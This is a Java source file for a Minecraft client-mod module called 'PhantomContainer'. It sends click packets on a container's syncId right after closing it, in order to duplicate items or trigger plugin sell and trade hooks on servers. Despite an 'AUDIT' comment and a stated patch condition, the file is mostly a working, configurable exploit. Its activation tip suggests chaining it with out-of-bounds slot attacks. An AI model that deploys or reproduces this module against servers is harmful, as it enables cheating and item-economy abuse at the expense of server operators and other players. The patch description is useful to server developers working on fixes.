package com.example.addon.modules.antidupe;

import com.example.addon.AddonTemplate;
import com.example.addon.modules.crash.PreStress;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
import net.minecraft.network.packet.s2c.play.InventoryS2CPacket;
import net.minecraft.network.packet.s2c.play.ScreenHandlerSlotUpdateS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

/**
 * AUDIT: Phantom Container (post-close click)
 *
 * Sends a close-screen packet followed immediately by click packets that
 * reference the (now-closed) container's syncId. If the server processes the
 * close asynchronously — or if the container handler isn't torn down before the
 * click is dispatched — the click acts on a container that from the server's
 * perspective no longer exists, potentially moving items out of a closed container
 * or triggering plugin sell/trade hooks on a phantom session.
 *
 * A variant of the classic "post-close click" from older Paper builds, updated
 * for 1.21 state-ID tracking.
 *
 * Patch signal: the close-screen handler must synchronously null the player's
 * open container and reject any subsequent click whose syncId matches the
 * just-closed container, before the close packet's response is sent.
 */
public class PhantomContainer extends Module {
    public enum Trigger { EACH_TICK, KEYBIND }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> clicksAfterClose = sgGeneral.add(new IntSetting.Builder()
        .name("clicks-after-close").description("Click packets sent in the same tick as the close.")
        .defaultValue(5).range(1, 100).sliderRange(1, 30).build()
    );
    private final Setting<Integer> targetSlot = sgGeneral.add(new IntSetting.Builder()
        .name("target-slot").description("Slot to click after close.")
        .defaultValue(0).range(0, 200).sliderRange(0, 53).build()
    );
    private final Setting<Trigger> trigger = sgGeneral.add(new EnumSetting.Builder<Trigger>()
        .name("trigger").defaultValue(Trigger.EACH_TICK).build()
    );
    private final Setting<meteordevelopment.meteorclient.utils.misc.Keybind> key = sgGeneral.add(new KeybindSetting.Builder()
        .name("key")
        .defaultValue(meteordevelopment.meteorclient.utils.misc.Keybind.fromKey(org.lwjgl.glfw.GLFW.GLFW_KEY_P))
        .visible(() -> trigger.get() == Trigger.KEYBIND).build()
    );

    private final PreStress preStress = new PreStress(sgGeneral);
    private final DupeObserver obs = new DupeObserver(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    private boolean wasPressed = false;

    public PhantomContainer() {
        super(AddonTemplate.DUPE_CATEGORY, "phantom-container",
            "Closes a container then immediately sends click packets on the same syncId. Tests post-close click rejection.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; wasPressed = false;
        obs.onActivate(); preStress.onActivate(this);
        info("Tip: combine with slot-exploit — try OOB slot indices on the phantom syncId for a compound attack.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null || mc.player.currentScreenHandler == null
            || mc.player.currentScreenHandler == mc.player.playerScreenHandler) return;
        ticksActive++;
        obs.tick();

        boolean fire;
        if (trigger.get() == Trigger.EACH_TICK) fire = true;
        else { boolean p = key.get().isPressed(); fire = p && !wasPressed; wasPressed = p; }
        if (!fire) return;

        var handler = mc.player.currentScreenHandler;
        int syncId = handler.syncId;
        int rev = handler.getRevision();

        // Close first
        mc.player.networkHandler.sendPacket(new CloseHandledScreenC2SPacket(syncId));
            packetsSent++;

        // Then immediately click the (now phantom) container
        for (int i = 0; i < clicksAfterClose.get(); i++) {
            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                syncId, rev, (short) (int) targetSlot.get(), (byte) 0, SlotActionType.QUICK_MOVE,
                new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
            packetsSent++;
        }
        obs.markFired();
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            obs.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) {
        obs.onReceive(event.packet);
        if (event.packet instanceof ScreenHandlerSlotUpdateS2CPacket p)
            info("Server updated slot %d → %s (syncId %d)", p.getSlot(), p.getStack().getName().getString(), p.getSyncId());
        else if (event.packet instanceof InventoryS2CPacket p)
            info("Server resynced inventory (syncId %d, %d slots)", p.syncId(), p.contents().size());
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        obs.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
